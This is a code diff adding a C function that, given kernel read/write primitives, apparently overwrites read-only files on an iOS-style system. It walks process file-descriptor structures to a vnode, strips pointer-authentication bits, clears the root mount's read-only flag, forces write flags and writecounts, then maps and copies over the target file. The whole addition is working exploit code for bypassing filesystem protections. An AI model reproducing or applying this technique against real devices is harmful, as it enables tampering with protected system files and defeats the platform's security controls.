@@ -432,3 +432,80 @@ void test(void) {
         }
     }
 }
+
+uint64_t funVnodeOverwriteFile(char* to, char* from) {
+
+    int to_file_index = open(to, O_RDONLY);
+    if (to_file_index == -1) return -1;
+    off_t to_file_size = lseek(to_file_index, 0, SEEK_END);
+    
+    int from_file_index = open(from, O_RDONLY);
+    if (from_file_index == -1) return -1;
+    off_t from_file_size = lseek(from_file_index, 0, SEEK_END);
+    
+    if(to_file_size < from_file_size) {
+        close(from_file_index);
+        close(to_file_index);
+        printf("[-] File is too big to overwrite!");
+        return -1;
+    }
+    
+    uint64_t proc = getProc(getpid());
+    
+    //get vnode
+    uint64_t filedesc_pac = kread64(proc + off_p_pfd);
+    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
+    uint64_t openedfile = kread64(filedesc + (8 * to_file_index));
+    uint64_t fileglob_pac = kread64(openedfile + off_fp_glob);
+    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
+    uint64_t vnode_pac = kread64(fileglob + off_fg_data);
+    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
+    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
+    
+    uint64_t rootvnode_mount_pac = kread64(findRootVnode() + off_vnode_v_mount);
+    uint64_t rootvnode_mount = rootvnode_mount_pac | 0xffffff8000000000;
+    uint32_t rootvnode_mnt_flag = kread32(rootvnode_mount + off_mount_mnt_flag);
+    
+    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag & ~MNT_RDONLY);
+    kwrite32(fileglob + off_fg_flag, FREAD | FWRITE);
+    
+    uint32_t to_vnode_v_writecount =  kread32(to_vnode + off_vnode_v_writecount);
+    printf("[i] %s Increasing to_vnode->v_writecount: %d\n", to, to_vnode_v_writecount);
+    if(to_vnode_v_writecount <= 0) {
+        kwrite32(to_vnode + off_vnode_v_writecount, to_vnode_v_writecount + 1);
+        printf("[+] %s Increased to_vnode->v_writecount: %d\n", to, kread32(to_vnode + off_vnode_v_writecount));
+    }
+    
+
+    char* from_mapped = mmap(NULL, from_file_size, PROT_READ, MAP_PRIVATE, from_file_index, 0);
+    if (from_mapped == MAP_FAILED) {
+        perror("[-] Failed mmap (from_mapped)");
+        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
+        close(from_file_index);
+        close(to_file_index);
+        return -1;
+    }
+    
+    char* to_mapped = mmap(NULL, to_file_size, PROT_READ | PROT_WRITE, MAP_SHARED, to_file_index, 0);
+    if (to_mapped == MAP_FAILED) {
+        perror("[-] Failed mmap (to_mapped)");
+        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
+        close(from_file_index);
+        close(to_file_index);
+        return -1;
+    }
+    
+    memcpy(to_mapped, from_mapped, from_file_size);
+    printf("[i] msync ret: %d\n", msync(to_mapped, to_file_size, MS_SYNC));
+    
+    munmap(from_mapped, from_file_size);
+    munmap(to_mapped, to_file_size);
+    
+    kwrite32(fileglob + off_fg_flag, FREAD);
+    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
+    
+    close(from_file_index);
+    close(to_file_index);
+    
+    return 0;
+}
